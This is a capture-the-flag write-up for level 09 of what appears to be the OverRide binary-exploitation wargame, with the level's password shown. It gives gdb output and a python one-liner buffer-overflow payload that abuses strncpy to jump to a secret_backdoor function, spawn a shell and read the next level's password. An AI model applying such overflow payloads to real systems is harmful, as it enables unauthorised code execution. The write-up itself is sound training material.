# Level 09
*password : fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S*

## Analyze

```
scp -P 4242 level09@192.168.56.109:level09 binary/
```
Interesting part:
```
strncpy(buffer, msg, buffer[180]);
```
buffer[180] is filled by username

## Buffer overflow : strncpy exploit

**objective** : execute `secret_backdoor`

```
(gdb) info funct secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```
`secret_backdoor()` address : 0x000055555555488c\
- offset : 200 
- `buffer[180]` : 200 + 8 = 208 (d0 in hexadecimal)

```
$ python -c 'print "\x41" * 40 + "\xd0" + "\n" + "\x41" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' > /tmp/level09 ; cat /tmp/level09 - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
```
$ su end
Password: 
end@OverRide:~$ cat end
GG !
```
